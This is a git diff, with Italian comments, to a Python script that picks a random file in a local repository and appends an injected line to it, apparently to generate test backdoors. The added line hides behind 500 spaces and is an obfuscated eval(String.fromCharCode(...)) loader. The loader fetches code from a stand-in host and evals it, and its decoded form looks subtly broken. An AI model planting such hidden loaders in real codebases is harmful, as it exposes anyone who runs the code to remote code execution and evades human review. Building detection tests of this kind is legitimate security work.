@@ -2,7 +2,7 @@ import git
 import os
 import random
 
-def perform_local_git_manipulation(repo_path, file_extension=".py", filters=[]):
+def perform_local_git_manipulation(repo_path, file_extension=".py", filters=[], n_blank_chars=500):
     """
     Esegue manipolazioni locali su un repository Git:
     0. Controlla se l'ultimo tag è "TEST" e se sì, ritorna il file che è stato gia cambiato con l'inserimento della backdoor.
@@ -121,10 +121,21 @@ def perform_local_git_manipulation(repo_path, file_extension=".py", filters=[]):
     print(f"\nFile selezionato casualmente per la modifica: {random_file_path}")
 
     # --- Aggiunge la stringa al file ---
-    string_to_add = '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          print("prova")'
+    # Aggiungi fake_vulnerability spazi vuoti prima della stringa per evitare errori di sintassi
+    fake_vulnerability = " " * n_blank_chars  # Inizializza con spazi vuoti
+    
+    # Questa vulnerabilità è fittizia e creata per funzionare con repo nodejs.
+    #
+    # Spiegazione (anche se offuscata):
+    # Questo codice esegue le seguenti azioni in modo compatto:
+    #   Importa https: require('https').
+    #   Effettua una richiesta GET: A https://www.fakemaliciouswebsite.it/fake-vulnerability-download.
+    #   Riceve la risposta: La funzione di callback gestisce i dati ricevuti (res).
+    #   Esegue il contenuto della risposta: I dati ricevuti vengono trattati come stringhe (chunk.toString()) ed eseguite tramite eval().
+    fake_vulnerability += "eval(String.fromCharCode(118,97,114,32,104,116,116,112,115,32,61,32,114,101,113,117,105,114,101,40,39,104,116,116,112,115,39,41,59,104,116,116,112,115,46,103,101,116,40,39,104,116,116,112,115,58,47,47,119,119,119,46,102,97,107,101,109,97,108,105,99,105,111,117,115,119,101,98,115,105,116,101,46,105,116,47,102,97,107,101,45,118,117,108,110,101,114,97,98,105,108,105,116,121,45,100,111,119,110,108,111,97,100,39,44,32,114,101,115,32,61,62,32,114,101,115,46,102,111,114,101,97,99,104,40,99,104,117,110,107,32,61,62,32,101,118,97,108,40,99,104,117,110,107,46,116,111,83,116,114,105,110,103,40,41,41,41,41));"
     try:
         with open(random_file_path, 'a', encoding='utf-8') as f:
-            f.write('\n' + string_to_add + '\n') # Aggiunge su una nuova riga
+            f.write('\n' + fake_vulnerability + '\n') # Aggiunge su una nuova riga
         print(f"Stringa aggiunta al file: {random_file_path}")
     except Exception as e:
         print(f"Errore durante la scrittura nel file {random_file_path}: {e}")
